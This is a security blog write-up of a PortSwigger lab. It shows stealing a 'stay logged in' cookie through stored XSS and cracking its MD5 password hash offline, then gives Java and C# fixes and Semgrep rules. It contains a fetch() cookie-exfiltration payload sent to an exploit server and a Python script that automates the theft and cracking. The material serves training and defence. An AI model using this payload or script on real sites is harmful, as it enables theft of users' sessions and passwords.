---
title: "Lab 10: Offline password cracking"
date: 2025-12-20
categories: [portswigger, authentication] 
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-20-lab10_authentication/
---

## 1. Executive Summary

**Vulnerability:** Weak Cryptography (Hash Exposure) & Stored XSS.

**Description:** The application's "Stay Logged In" cookie contains the user's password hashed with MD5 (a weak algorithm) inside a Base64 string. The application also has a Stored XSS vulnerability in the comments section.

**Impact:** Password Disclosure. An attacker can steal the cookie using XSS, decode it to obtain the MD5 hash, and then crack the hash offline using a rainbow table or wordlist. This reveals the victim's permanent password, allowing access even after the session cookie expires.

## 2. The Attack

**Objective:** Steal `carlos`'s cookie, crack his password, and delete his account.

1. **Reconnaissance (Cookie Analysis):**
    - I logged in as `wiener` with "Stay logged in" enabled.
    - The cookie was `stay-logged-in=...`.
    - Decoding the Base64 revealed: `username:MD5(password)`.
2. **The Trap (XSS):**
    - I navigated to the Blog Comments section.
    - I posted a comment containing the following payload to send the victim's cookies to my Exploit Server:HTML
        
        `<script>
        fetch('https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?cookie=' + document.cookie);
        </script>`
        
3. **The Theft:**
    - The victim (simulated bot) viewed the comment.
    - I checked the **Access Log** on the Exploit Server and found a request:
    `GET /?cookie=stay-logged-in=carlos:26323c16d5f4dabff3bb136f2460a943...`
        
        ![image.png](image.png)
        
4. **The Crack:**
    - I extracted the hash: `26323c16d5f4dabff3bb136f2460a943`.
    - I used an online lookup tool [CrackStation](https://crackstation.net/)(or local tool like hashcat) to crack the MD5 hash.
    - **Result:** The password is `onceuponatime`.
        
        ![image.png](image%201.png)
        
5. **The End:** I logged in as `carlos` using the plaintext password and deleted the account.

## 3. Code Review

### Java (Spring Boot)

```java
@PostMapping("/login")
public void login(User user, HttpServletResponse response) {
    if (checkPassword(user)) {
        // VULNERABLE: Constructing cookie from sensitive data
        String rawCookie = user.getUsername() + ":" + MD5(user.getPassword());
        String encoded = Base64.getEncoder().encodeToString(rawCookie.getBytes());
        
        Cookie cookie = new Cookie("stay-logged-in", encoded);
        
        // VULNERABLE: Missing HttpOnly flag
        cookie.setHttpOnly(false); 
        
        response.addCookie(cookie);
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`MD5(user.getPassword())`**: The application uses a fast, cryptographically broken hashing algorithm. Because MD5 is fast, attackers can check billions of passwords per second against the leaked hash.
- **`cookie.setHttpOnly(false)`**: (Or omitting the call entirely). By default, cookies can be accessed by JavaScript (`document.cookie`). This allows the XSS payload to read the sensitive token.
- **Risk**: The combination of `Client-Accessible Cookie` + `Reversible Data` turns a temporary session hijack into a permanent password breach.

### C# (ASP.NET Core)

```csharp
public void SignIn(User user)
{
    // VULNERABLE: MD5 is broken and allows offline cracking
    using var md5 = MD5.Create();
    var hashBytes = md5.ComputeHash(Encoding.UTF8.GetBytes(user.Password));
    var hashString = BitConverter.ToString(hashBytes).Replace("-", "").ToLower();

    var payload = $"{user.Username}:{hashString}";
    var cookieValue = Convert.ToBase64String(Encoding.UTF8.GetBytes(payload));

    // VULNERABLE: HttpOnly defaults to false in some contexts if not specified
    Response.Cookies.Append("stay-logged-in", cookieValue, new CookieOptions 
    { 
        HttpOnly = false, // Explicitly insecure
        Expires = DateTime.Now.AddDays(30) 
    });
}
```

**Technical Flow & Syntax Explanation:**

- **`MD5.Create()`**: Instantiates the legacy hashing algorithm.
- **`HttpOnly = false`**: This property controls whether the browser exposes the cookie to client-side scripts. Setting it to `false` makes the cookie accessible to `document.cookie`, enabling the XSS theft.

### Mock PR Comment

The "Stay Logged In" cookie exposes the user's password hash (MD5). If this cookie is leaked (e.g., via XSS), an attacker can crack the hash offline to recover the plaintext password.

**Recommendation:**

1. **Use Random Tokens:** Replace the user-derived hash with a cryptographically secure random string (UUID or 32-byte hex) stored in the database.
2. **Enable HttpOnly:** Set the `HttpOnly` flag on the cookie to prevent JavaScript access.

## 4. The Fix

**Explanation of the Fix:**
We eliminate the offline cracking risk by using **Random Tokens** (Opaque Tokens) that contain no user data. We eliminate the theft risk by setting the **HttpOnly** flag.

### Secure Java

```java
@PostMapping("/login")
public void login(User user, HttpServletResponse response) {
    // SECURE: Random token, no relationship to password
    String token = SecureRandom.hex(32); 
    tokenRepository.save(user, token);

    Cookie cookie = new Cookie("stay-logged-in", token);
    
    // SECURE: JavaScript cannot read this cookie
    cookie.setHttpOnly(true);
    // SECURE: Only send over HTTPS
    cookie.setSecure(true);
    
    response.addCookie(cookie);
}
```

**Technical Flow & Syntax Explanation:**

- **`SecureRandom`**: Generates a value that cannot be predicted or reversed. Even if stolen, it reveals nothing about the password.
- **`setHttpOnly(true)`**: This instructs the browser to hide the cookie from `document.cookie`. The XSS payload `fetch(document.cookie)` would return an empty string or omit this specific cookie.

### Secure C#

```csharp
public void SignIn(User user)
{
    // SECURE: Random Opaque Token
    var token = Convert.ToBase64String(RandomNumberGenerator.GetBytes(32));
    _db.SaveUserToken(user.Id, token);

    Response.Cookies.Append("stay-logged-in", token, new CookieOptions 
    { 
        HttpOnly = true, // Prevents XSS theft
        Secure = true,   // Prevents Man-in-the-Middle theft
        SameSite = SameSiteMode.Strict
    });
}
```

**Technical Flow & Syntax Explanation:**

- **`RandomNumberGenerator.GetBytes(32)`**: Uses the OS CSPRNG.
- **`HttpOnly = true`**: Mitigates the XSS vector entirely regarding this cookie.

## 5. Automation

*A Python script that posts the XSS payload, retrieves the stolen cookie from the logs, cracks the hash using a local wordlist, and logs in.*

```python
#!/usr/bin/env python3
import argparse
import requests
import re
import base64
import hashlib
import sys
import time

def crack_md5(target_hash, wordlist_path):
    print(f"[*] Attempting to crack MD5 hash: {target_hash}")
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        for password in f:
            password = password.strip()
            if hashlib.md5(password.encode()).hexdigest() == target_hash:
                return password
    return None

def exploit_offline_crack(url, exploit_server, password_list):
    s = requests.Session()
    
    # 1. Login as Wiener (to post comment)
    login_url = f"{url.rstrip('/')}/login"
    print("[*] Logging in as wiener...")
    s.post(login_url, data={'username': 'wiener', 'password': 'peter'})
    
    # 2. Post XSS Payload
    comment_url = f"{url.rstrip('/')}/post/comment"
    # Note: Lab usually requires a specific postId, we assume '1' or discover it.
    # For automation, we'll try postId=1.
    post_id = "1" 
    
    payload = f"<script>fetch('{exploit_server}/?cookie=' + document.cookie);</script>"
    
    data = {
        "postId": post_id,
        "comment": payload,
        "name": "hacker",
        "email": "hacker@evil.com",
        "website": ""
    }
    
    print("[*] Posting XSS payload...")
    s.post(comment_url, data=data)
    
    print("[*] Waiting for victim to view comment...")
    time.sleep(5) 
    
    # 3. Retrieve Access Log
    log_url = f"{exploit_server}/log"
    print(f"[*] Fetching logs from: {log_url}")
    # The exploit server needs its own session or key usually, 
    # but in the lab context, the browser session is shared or IP based.
    # We might need to handle this manually if the script can't access the log.
    resp = requests.get(log_url)
    
    # 4. Extract Cookie
    # Pattern: cookie=stay-logged-in=BASE64STRING
    match = re.search(r'stay-logged-in=([a-zA-Z0-9+/=]+)', resp.text)
    if not match:
        print("[-] Could not find stolen cookie in logs.")
        sys.exit(1)
        
    encoded_cookie = match.group(1)
    print(f"[+] Stolen Cookie (Base64): {encoded_cookie}")
    
    # 5.Decode and Extract Hash
    try:
        decoded = base64.b64decode(encoded_cookie).decode()
        # Format: username:md5hash
        victim_user, victim_hash = decoded.split(':')
        print(f"[+] Decoded: User={victim_user}, Hash={victim_hash}")
    except:
        print("[-] Failed to decode cookie format.")
        sys.exit(1)
        
    # 6. Crack Hash
    plaintext = crack_md5(victim_hash, password_list)
    if plaintext:
        print(f"\n[!!!] PASSWORD CRACKED: {plaintext}")
        
        # 7. Login and Delete (Proof of Concept)
        # s.post(login_url, data={'username': victim_user, 'password': plaintext})
        # s.post(f"{url}/my-account/delete", data={'password': plaintext})
        # print("[+] Account deleted.")
    else:
        print("[-] Password not found in wordlist.")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url", help="Lab URL")
    ap.add_argument("exploit_server", help="Exploit Server URL (e.g. https://exploit-ID.exploit-server.net)")
    ap.add_argument("wordlist", help="Path to password wordlist")
    args = ap.parse_args()

    exploit_offline_crack(args.url, args.exploit_server, args.wordlist)

if __name__ == "__main__":
    main()
```

## 6. Static Analysis (Semgrep)

*These rules detect cookies created without the `HttpOnly` flag or utilizing weak hashing algorithms for token generation.*

### Java Rule

```yaml
rules:
  - id: java-insecure-cookie-storage
    languages: [java]
    message: |
      Cookie created without HttpOnly flag. This allows XSS to steal the cookie.
      Also check if the cookie value contains sensitive data (MD5).
    severity: WARNING
    patterns:
      - pattern: |
          Cookie $C = new Cookie(...);
          ...
          $C.setHttpOnly(false);
      - pattern-not: |
          $C.setHttpOnly(true);
```

**Technical Flow & Syntax Explanation:**

- **`setHttpOnly(false)`**: Explicitly flags the insecure configuration.
- **Implicit Default**: Note that in Java Servlets, if `setHttpOnly` is not called, it defaults to `false` (in older versions) or depends on container config. A more aggressive rule would flag any `new Cookie` that lacks a corresponding `setHttpOnly(true)` call.

### C# Rule

```yaml
rules:
  - id: csharp-weak-cookie-hash
    languages: [csharp]
    message: "Potential hash exposure in cookie. Ensure cookies are opaque and HttpOnly."
    severity: WARNING
    patterns:
      - pattern: |
          MD5.Create().ComputeHash(...)
      - pattern-inside: |
          Response.Cookies.Append(...)
```

**Technical Flow & Syntax Explanation:**

- **Contextual Matching**: This rule looks for MD5 usage *inside* the logic block that appends cookies. This suggests the hash is being sent to the client.
